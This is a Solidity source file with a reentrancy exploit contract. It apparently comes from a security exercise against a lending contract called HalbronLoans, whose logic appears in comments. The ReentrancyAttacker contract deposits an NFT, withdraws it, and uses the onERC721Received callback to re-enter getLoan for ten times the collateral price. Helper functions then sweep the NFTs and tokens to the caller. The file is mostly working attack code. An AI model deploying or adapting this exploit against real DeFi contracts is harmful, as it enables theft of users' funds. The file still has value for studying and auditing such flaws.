// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
 interface IERC20 {
    
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
  }

interface IERC721  {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon
     *   a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or
     *   {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon
     *   a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(address from, address to, uint256 tokenId) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721
     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must
     * understand this adds an external call which potentially creates a reentrancy vulnerability.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 tokenId) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the address zero.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface ReentrancyVictim {
  function depositNFTCollateral(uint256 id) external;
   /*     require(
            nft.ownerOf(id) == msg.sender,
            "Caller is not the owner of the NFT"
        );

        nft.safeTransferFrom(msg.sender, address(this), id);

        totalCollateral[msg.sender] += collateralPrice;
        idsCollateral[id] = msg.sender;
        */
 

    function withdrawCollateral(uint256 id) external;
       /* require(
            totalCollateral[msg.sender] - usedCollateral[msg.sender] >=
                collateralPrice,
            "Collateral unavailable"
        );
        require(idsCollateral[id] == msg.sender, "ID not deposited by caller");

        nft.safeTransferFrom(address(this), msg.sender, id);
        totalCollateral[msg.sender] -= collateralPrice;
        delete idsCollateral[id];*/


    function getLoan(uint256 amount) external; 
        /* {require(
            totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount,
            "Not enough collateral"
        );
        usedCollateral[msg.sender] += amount;
        token.mintToken(msg.sender, amount);}
    */
    
}

// victim in our case HalbronLoans smartcotnract
contract ReentrancyAttacker {
    address victim;
    address NFTtokenToUse;
    uint256 priceOfCollateral;
    constructor(address _victim,address NFTtoken, uint256 price) {
        victim = _victim;
        NFTtokenToUse=NFTtoken;
        priceOfCollateral=price;
    }

function setNewVictim(address _victim,address NFTtoken) public {
        victim = _victim;
        NFTtokenToUse=NFTtoken;
    }

    function attack(uint256 idOfNFT) public payable {
   // Transfer NFT token to this contract before atack is performed

       IERC721(NFTtokenToUse).setApprovalForAll(victim,true);
 
        ReentrancyVictim(victim).depositNFTCollateral(idOfNFT);
        ReentrancyVictim(victim).withdrawCollateral(idOfNFT);
    }

    receive() external payable {

    }


        // Event to log NFT reception
    event NFTReceived(address operator, address from, uint256 tokenId, bytes data);

    // ERC721Receiver magic value
    bytes4 private constant ERC721_RECEIVED = 0x150b7a02;
    // ERC721Receiver function
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // You can add additional validation here if needed
        
        // Emit an event or perform any actions upon receiving the NFT
        emit NFTReceived(operator, from, tokenId, data);

        ReentrancyVictim(victim).getLoan(10*priceOfCollateral);// if getloan fixed should be set to jsut price for testing. as now you can get unlimited loan


        // Return the ERC721Receiver magic value to signal successful receipt of the NFT
        return ERC721_RECEIVED;
    }

    function withdrawNFTs(uint256 idNFT) public returns(bool){
        IERC721(NFTtokenToUse).transferFrom(address(this),tx.origin,idNFT);

    return true;
    }

    function withdrawTokenX(address Token) public returns(bool){
    IERC20(Token).transfer(tx.origin,IERC20(Token).balanceOf(address(this)));
        return true;
    }
   
}

 
